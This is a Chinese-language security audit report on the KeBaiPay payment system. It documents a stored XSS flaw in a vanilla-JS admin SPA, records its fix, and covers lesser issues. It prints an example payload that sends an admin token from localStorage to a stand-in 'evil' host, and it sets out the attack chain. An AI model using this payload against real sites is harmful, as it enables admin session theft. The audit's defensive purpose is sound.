# KeBaiPay 全面问题排查报告

> 排查日期：2026-09-14 · 版本 v0.3.0 → v0.3.1 · 范围：后端 36k 行 / 三端 Vue / 原生 SPA / 部署配置
> 结论：**发现 1 个高危漏洞（存储型 XSS，可利用至管理员会话接管），已于 v0.3.1 修复**；
> 其余为中低风险与技术债。资金链路的并发与幂等实现质量明显高于同类项目。

---

## 一、结论速览

| 级别 | 问题 | 状态 |
|---|---|---|
| 🔴 **P0** | `public/app.js` 存储型 XSS，198 处 `innerHTML` 仅 11 处转义 | ✅ 已修复（escapeHtml 覆盖 328 处 + 内联事件 jsStr/jsNum 收敛） |
| 🟠 P1 | `security` 模块 0% 测试覆盖（承载 SSRF 加固等安全逻辑） | 建议补测 |
| 🟠 P1 | `/metrics` 未配置 token 时默认开放 | 建议生产强制 |
| 🟠 P1 | 三端主包 1.1 MB（gzip 367 kB），无代码分割 | 影响 H5 首屏 |
| 🟡 P2 | NestJS 11 → 12 存在 major 版本差 | 技术债，需规划 |
| 🟡 P2 | 测试对资源敏感，高并发下 OOM | 已用 `--maxWorkers` 规避 |
| 🟡 P2 | `public/app.js` 7019 行单文件原生 JS | 维护性隐患 |

---

## 一·五、P0 修复记录（v0.3.1）

**修了什么**（全部位于 `public/app.js`）：

1. **升级 `escapeHtml()`**：改为字符表替换，同时转义 `& < > " '`（原实现基于 `textContent` 往返，不转义引号；且 `!str` 判空会吞掉 `0`/`false`）。修复后可直接用于双引号包裹的 HTML 属性。
2. **新增 `escapeAttr()`**：语义别名，明确表示"该值进入 HTML 属性"。
3. **新增 `jsStr()` / `jsNum()` / `jsBool()`**：用于 `onclick="fn(...)"` 这类内联事件属性。`jsStr` = `JSON.stringify`（JS 层转义）+ `escapeHtml`（HTML 层转义），两层防护；`jsNum`/`jsBool` 把参数强制收敛为数字/布尔，杜绝任意表达式注入。
4. **批量转义**：全部 195 个 HTML 模板块中的动态插值补上转义，`escapeHtml` 调用从 11 处增至 **328 处**；URL / Authorization / 日志等非 HTML 模板不转义（避免 `&`→`&amp;` 破坏 URL）。
5. **34 处内联事件**的字符串参数全部改为 `jsStr()`，数字参数改为 `jsNum()`。

**验证**：

- 函数级：8 组典型 payload（`"><img onerror>`、`<script>`、`</div><svg onload>`、`';alert();'` 等）在文本/属性/内联事件三种上下文下往返一致、无裸字符残留。
- 端到端：真实商户入驻接口提交 `merchantName = '"><img src=x onerror=...>'`（证实后端无输入过滤，与审计一致），管理员在 Chromium 中打开审核页 —— **payload 未执行、无 dialog、DOM 中以转义文本呈现**。

**残余风险**：后端 DTO 对 `merchantName`/`remark` 等仍无长度/字符约束（纵深防御欠账，输入过滤不能替代输出转义，但二者都该有）。

---

## 二、🔴 P0：存储型 XSS（public/app.js）

### 问题

`public/app.js` 是一个 7019 行的原生 SPA，用模板字符串 + `innerHTML` 渲染页面。文件第 15 行定义了 `escapeHtml()`（实现正确：用 `textContent` 写入再取 `innerHTML`），但**全文件只有 11 处调用了它，却有 198 处 `innerHTML`**——转义覆盖率约 5.5%。

部分渲染点有转义（1132 / 1151 / 1635 / 2744 行），部分没有，说明是**遗漏而非有意设计**。

### 可利用的注入点（用户或商户可控字段）

| 行号 | 代码 | 可控来源 | 危险程度 |
|---|---|---|---|
| **4512** | `onclick="shareQrCode('${q.code}', ..., '${q.remark \|\| ''}')"` | 收款码备注 | ⚠️ **最高**：直接注入到事件属性 |
| **3371** | `<input id="editName" value="${m.merchantName}">` | 商户名 | ⚠️ **高**：属性注入可逃逸标签 |
| 3375 | `value="${m.contactName \|\| ''}"` | 联系人姓名 | 高 |
| 3675 / 3678 | `${m.merchantName}` `${m.contactName}` `${m.contactPhone}` | 商户入驻资料 | 高 |
| **3854** | `${order.merchant?.merchantName \|\| '-'}` | **收银台页面** | ⚠️ **高**：公开页面，任何付款人可见 |
| 4488 / 4490 | `${q.code}` `${q.remark}` | 收款码 | 高 |
| 4218 | `${a.name \|\| '未命名应用'}` | 应用名称 | 中 |
| 1894 / 3512 | `${b.counterparty}` | 交易对手方 | 中 |
| 2047 | `${bill.remark}` | 账单备注 | 中 |
| 2502 | `${code.code}` | 优惠券码 | 中 |

### 后端没有兜底

商户名与订单标题的 DTO 只有 `@IsString()` + `@IsNotEmpty()`，**没有字符白名单或 HTML 过滤**：

```ts
// src/merchants/dto/register-merchant.dto.ts
@IsString()
@IsNotEmpty()
merchantName!: string
```

所以攻击者可以直接提交：

```
merchantName = "><img src=x onerror="fetch('https://evil/'+localStorage.adminToken)">
```

### 攻击链

```
1. 攻击者注册商户，merchantName 写入 payload
2. 管理员登录后台查看商户列表 / 审核列表
3. 原生 SPA 用 innerHTML 渲染，payload 执行
4. 脚本读取 localStorage 里的 adminToken（app.js:4766 写入）
5. 令牌外传 → 攻击者以管理员身份调用全部管理 API
```

**为什么能拿到管理员令牌**：`app.js` 把 `adminToken` 存在 `localStorage`（147 / 370 / 4766 行），而 XSS 可以任意读取同源的 `localStorage`。这不是 token 存储方式的问题（HttpOnly Cookie 也可被 CSRF 利用），**根因是 XSS 本身**。

### 影响范围

- 三端 Vue 应用（`/admin` `/portal` `/h5`）**不受影响**——Vue 的 `{{ }}` 默认转义，且全仓无 `v-html`
- 受影响的是根路径 `/` 的原生 SPA，它同样承载用户端、商户端和管理端功能

### 修复建议

**立即（本次发布）**：

```js
// 1. 所有用户可控字段一律转义
- <div class="bill-type">${m.merchantName}</div>
+ <div class="bill-type">${escapeHtml(m.merchantName)}</div>

// 2. 插入 HTML 属性的场景，必须额外转义引号
- <input class="form-input" id="editName" value="${m.merchantName}">
+ <input class="form-input" id="editName" value="${escapeAttr(m.merchantName)}">

function escapeAttr(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

// 3. 事件属性内联最危险，改为 data 属性 + 事件委托
- <button onclick="shareQrCode('${q.code}', ..., '${q.remark || ''}')">分享</button>
+ <button class="btn-share" data-code="${escapeAttr(q.code)}" data-remark="${escapeAttr(q.remark || '')}">分享</button>
// 绑定一次：container.addEventListener('click', e => { const b = e.target.closest('.btn-share'); ... })
```

**中期**：给 `merchantName` / `subject` / `remark` / `contactName` 等字段加输入约束（长度 + 禁止 `<>`），做纵深防御——但**输入过滤不能替代输出转义**，二者都要有。

**长期**：这个 7019 行的原生 SPA 是三端 Vue 化之前的遗留物，与 `web/` `web-h5/` `web-admin/` 功能重叠。建议逐步废弃，把入口收敛到 Vue 应用。

---

## 三、🟠 P1 问题

### 1. `security` 模块 0% 测试覆盖

`src/security/` 共 72 行，**没有任何测试**。该模块承载 `SecurityValidatorService`（SSRF 加固等），在 `main.ts` 中被引用。安全逻辑没有回归测试，意味着改动无法被自动验证。

上一轮体检已知：整体覆盖率 53%（自设门槛 80%），其中 `red-packets` 15.8%、`escrow` 40.3%。**红包和担保交易都是资金模块**，测试密度与风险不匹配。

> 补充：这次人工审查了红包核心逻辑，**实现本身是正确的**（见第四节），但缺乏测试意味着后续改动容易引入回归。

### 2. `/metrics` 未配置 token 时默认开放

```ts
// src/metrics/metrics.controller.ts:17-18
 * `Authorization: Bearer <METRICS_TOKEN>`（Prometheus 原生支持 bearer_token）。
 * 未配置时保持开放（内网部署场景），生产环境建议同时启用 token 与反代限制。
```

有 `timingSafeEqual` 常量时间比较（实现正确），但**未配置 `METRICS_TOKEN` 时端点完全开放**。指标会暴露订单量、交易额、接口延迟等业务信息。

建议：生产环境（`NODE_ENV=production`）下若未配置 token 则拒绝启动，与 `docker-compose.yml` 里 `${POSTGRES_PASSWORD:?must be set}` 的强校验风格保持一致。

### 3. 前端主包 1.1 MB

三端主包均为 1,103–1,106 kB（gzip 367 kB），构建时触发 chunk 告警。Element Plus 全量打入主包，无路由级代码分割。对移动端 H5 首屏影响最大。

### 4. 测试资源敏感

`jest.config.js` 已设 `maxWorkers: '50%'`，但在 32 核机器上仍出现 worker 被 SIGKILL（`--maxWorkers=4` 时 3 个套件失败，`--maxWorkers=2` 全通过）。这是测试框架层面的资源问题，不是业务 bug，但会让 CI 偶发假红灯。

---

## 四、做得好的地方（客观记录）

排查中验证过、确认没有问题的部分：

| 项 | 验证结果 |
|---|---|
| **金额精度** | 全部用 `Int` 存**分**，无一处浮点金额字段；`helpers.ts` 的分/元换算用 1e-9 容差，安全 |
| **SQL 注入** | 原生 SQL 仅 5 处（4 处 `pg_advisory_xact_lock`、1 处 `SELECT 1`），全部参数化模板字符串，无拼接 |
| **鉴权覆盖** | 220 个端点中 211 个有 `@UseGuards`；剩余 9 个为登录/注册/健康检查/Webhook/短信，均合理 |
| **短信资损防护** | 多层 Redis 限流：手机号日限、IP 日限、同号 60s 重发间隔（SET NX EX 原子）、验证码尝试次数、10 分钟有效期 |
| **红包算法** | 标准二倍均值法；`remainingCount === 1` 时返回全部剩余（不留零头）；用 `crypto.randomInt` 防金额预测；创建时校验 `amount >= count` |
| **红包并发** | 分布式锁 + 事务 + `remainingCount: { gt: 0 }` 条件原子更新，防超领 |
| **容器安全** | Dockerfile 建非 root 用户 `nestjs`(1001)；compose 用 `${VAR:?must be set}` 强制密码配置，防止空密码启动 |
| **安全中间件** | helmet 已启用；全局限流（default 100/min、auth 10/min、open-api 30/min）；登录端点有专属限流 |
| **错误泄露** | 全局异常过滤器生产环境剥离 stack；CORS 白名单默认为 localhost 而非 `*` |
| **数据库索引** | 52 个模型 / 193 个索引与唯一约束；订单号、幂等键均有唯一索引 |
| **OpenAPI 一致性** | 源码 220 路由 vs 文档 220，零漂移 |

---

## 五、建议的修复顺序

1. **本周**：修 `public/app.js` 的 XSS（P0），重点处理 4512 / 3371 / 3854 三处；补 `security` 模块测试
2. **下个版本**：`/metrics` 生产环境强制 token；前端代码分割（H5 优先）
3. **规划中**：NestJS 12 升级评估；红包/担保交易补测；原生 `app.js` 的废弃路线

---

## 附：本次排查方法

- 静态扫描：金额类型、原生 SQL、守卫覆盖（自写 AST 级正则解析 37 个控制器）、XSS 插值点
- 人工审查：红包算法与并发控制、短信限流、鉴权矩阵、错误泄露、容器配置
- 工具：`npm audit`（0 漏洞）、`jest --coverage`（53%）、`tsc --noEmit`（0 error）、`vue-tsc`（三端 0 error）
